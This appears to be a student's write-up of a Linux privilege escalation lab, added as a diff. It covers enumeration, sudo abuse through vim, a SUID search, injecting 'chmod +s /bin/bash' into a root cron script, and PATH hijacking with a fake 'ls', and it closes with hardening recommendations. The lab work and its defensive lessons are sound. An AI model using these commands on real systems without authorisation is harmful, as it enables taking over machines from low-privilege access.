@@ -1,0 +1,96 @@
+Linux Privilege Escalation Lab
+🎯Objective
+The goal of this lab was to identify and exploit misconfigurations in a Linux system to escalate privileges from a normal user to root access using multiple techniques.
+  Tools Used
+-Linux terminal
+-sudo
+-find
+-ls
+-id
+-ps
+-crontab
+-Basic shell commands
+#Attack Techniques Covered
+-Sudo misconfigurations
+-SUID binary exploitation
+-Cron job abuse
+-PATH environment hijacking
+-Writable system files and scripts
+1. Initial Enumeration
+The first step was to understand the system and user privileges.
+Commands used:
+Bash
+-whoami
+-id
+-uname -a
+-sudo -l
+Observation:
+Checked current user permissions
+Identified sudo privileges (if any)
+Gathered system information for attack surface
+2. Sudo Privilege Escalation
+Checked allowed sudo commands:
+Bash
+-sudo -l
+-If a binary was allowed (example: vim, nano, less, find), it was exploited using GTFOBins techniques.
+Example:
+Bash
+-sudo vim -c ':!/bin/sh'
+-Result: Root shell obtained
+ 3. SUID Binary Exploitation
+Searched for SUID binaries:
+Bash
+-find / -perm -4000 -type f 2>/dev/null
+Concept:
+-SUID binaries run with root privileges even when executed by a normal user.
+Exploitation:
+-If a vulnerable binary was found, it was used to spawn a root shell or execute system commands.
+ 4. Cron Job Exploitation
+Checked scheduled tasks:
+Bash
+-cat /etc/crontab
+-ls -la /etc/cron.*
+Attack method:
+-Identified scripts running as root
+-Checked if scripts were writable
+-Injected malicious commands into script
+Example payload:
+Bash
+-echo "chmod +s /bin/bash" >> backup.sh
+ -Result: Bash became SUID → root shell access
+ 5. PATH Environment Hijacking
+Checked PATH variable:
+Bash
+-echo $PATH
+Exploit:
+-If a script called a command without full path (like ls, cat), a fake binary was created.
+Example:
+Bash
+-echo "/bin/sh" > ls
+-chmod +x ls
+-export PATH=.:$PATH
+-Then when script executed ls, it triggered shell.
+ 6. Final Privilege Escalation Result
+After exploiting misconfigurations, root access was obtained using one or more of the following:
+-Sudo misconfigurations
+-SUID binaries
+-Cron job abuse
+-PATH hijacking
+Verification:
+Bash
+whoami
+Output:
+root
+-What I Learned
+Linux privilege escalation techniques
+Importance of system misconfiguration security
+Real-world exploitation of SUID, cron, sudo
+How attackers gain root access from low privileges
+-Security Recommendations
+Restrict sudo privileges strictly
+Remove unnecessary SUID binaries
+Secure cron jobs with proper permissions
+Use absolute paths in scripts
+Lock down environment variables like PATH
+-Impact of This Lab
+This lab helped me understand how attackers move from low-privilege access to full system compromise in Linux environments.
